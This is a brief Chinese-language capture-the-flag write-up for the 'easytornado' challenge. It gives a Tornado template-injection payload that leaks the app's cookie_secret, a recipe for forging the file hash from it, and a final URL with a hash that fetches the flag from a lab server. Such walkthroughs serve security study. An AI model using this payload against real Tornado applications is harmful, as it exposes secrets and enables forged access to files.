
# easytornado

* 到hint.html页面 获取cookie_secret
```  
error?msg={{handler.settings}}
```

* 将获取到cookie_secret 按要求拼接,filehash之后的数据要加密后生成
``` 
file?filename=/fllllllllllllag&filehash=md5(cookie_secret+md5(/fllllllllllllag))

http://220.249.52.133:59380/file?filename=/fllllllllllllag&filehash=312361ad334e233d12426db227e6fed9

```
